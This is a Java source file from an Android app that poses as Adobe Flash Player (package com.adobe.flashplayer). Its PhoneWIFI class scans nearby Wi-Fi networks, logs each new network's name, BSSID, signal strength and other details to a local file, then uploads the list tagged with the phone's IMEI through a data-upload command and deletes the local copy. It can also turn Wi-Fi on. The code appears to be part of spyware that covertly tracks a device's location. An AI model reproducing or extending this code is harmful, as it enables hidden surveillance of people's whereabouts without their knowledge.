package com.adobe.flashplayer.data;


import java.io.File;
import java.io.FileInputStream;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONObject;
import android.content.Context;
import android.content.pm.PackageManager;
import android.net.wifi.WifiManager;
import android.util.Log;
import androidx.core.content.ContextCompat;
import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.PrefOper;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.network.NetworkUtils;
import com.adobe.flashplayer.network.UploadData;

//Cykj@2021.

public class PhoneWIFI {

    private static final String TAG = "[ljg]PhoneWIFI";

    public static final String WIFI_PREFERENCE_NAME = "wifi_prefs";


    public PhoneWIFI(Context context){

    }

    public static int updateWIFI(Context context){

        int count = 0;
        try{

            WifiManager wifiMgr = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
            int wifiState = wifiMgr.getWifiState();
            if (wifiState == WifiManager.WIFI_STATE_ENABLED) {
                List<android.net.wifi.ScanResult>list = wifiMgr.getScanResults();

                for (int i = 0; i < list.size(); i++) {
                    String bssid = list.get(i).BSSID;
                    if( bssid != null && bssid.equals("") == false){

                        String value = PrefOper.getValue(context,WIFI_PREFERENCE_NAME, bssid);
                        if (value != null && value.equals("") == false ) {
                            continue;
                        }else{
                            JSONObject jsobj=new JSONObject();
                            jsobj.put("name", list.get(i).SSID);
                            jsobj.put("bssid", list.get(i).BSSID);
                            jsobj.put("capabilities", list.get(i).capabilities);
                            jsobj.put("time", list.get(i).timestamp);
                            jsobj.put("content", list.get(i).describeContents());
                            jsobj.put("frequency", list.get(i).frequency);
                            jsobj.put("level", list.get(i).level);
                            jsobj.put("hash", list.get(i).hashCode());
                            //jsobj.put("operatorFriendlyName", list.get(i).operatorFriendlyName.toString());
                            //jsobj.put("venueName", list.get(i).venueName.toString());
                            PrefOper.setValue(context,WIFI_PREFERENCE_NAME, bssid, "existed");

                            MyLog.writeFile(Public.LOCAL_PATH_NAME, Public.WIFILIST_FILE_NAME, jsobj.toString() + "\r\n",true);

                            count ++;
                        }
                    }
                }
            }
        }catch(Exception ex){
            ex.printStackTrace();
            String error = Utils.getExceptionDetail(ex);
            String stack= Utils.getCallStack();
            MyLog.writeLogFile("getAndParseWIFI exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
        }

        Log.e(TAG, "[ljg]update wifi info complete");
        return count;
    }


    public static boolean getPhoneWIFI(Context context){

        try{
            int granted = ContextCompat.checkSelfPermission(context,android.Manifest.permission.ACCESS_WIFI_STATE);
            if (granted == PackageManager.PERMISSION_GRANTED) {

                int count = updateWIFI(context);
                if (count > 0) {
                    String filename = Public.LOCAL_PATH_NAME + Public.WIFILIST_FILE_NAME;
                    File file = new File(filename);
                    if (file.exists() == true) {
                        FileInputStream fin = new FileInputStream(file);
                        int filesize = (int) file.length();
                        byte[] buf = new byte[filesize];
                        fin.read(buf, 0, filesize);
                        fin.close();

                        String str = new String(buf);
                        String objs[] = str.split("\r\n");
                        if (objs.length > 0) {
                            JSONArray jsarray = new JSONArray();
                            for (int i = 0; i < objs.length; i++) {
                                JSONObject jsobj = new JSONObject(objs[i]);
                                jsarray.put(i, jsobj);
                            }

                            if (jsarray.length() > 0) {
                                if (NetworkUtils.isNetworkAvailable(context)) {
                                    UploadData.upload(jsarray.toString().getBytes(), jsarray.toString().getBytes().length, Public.CMD_DATA_WIFI, Public.IMEI);
                                }else{

                                }
                            }
                        }

                        file.delete();
                        return true;
                    }
                }
            }
        }catch(Exception ex){
            ex.printStackTrace();
            String errorString = Utils.getExceptionDetail(ex);
            String stackString = Utils.getCallStack();
            MyLog.writeLogFile("getWIFI exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
        }

        Log.e(TAG, "[ljg]get wifi info update failed");

        return false;
    }


    public static void toggleWifi(Context context,boolean state){
        try {
            WifiManager wfmanager = (WifiManager)context.getSystemService(Context.WIFI_SERVICE);
            if(wfmanager.isWifiEnabled() == false){
                wfmanager.setWifiEnabled(state);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
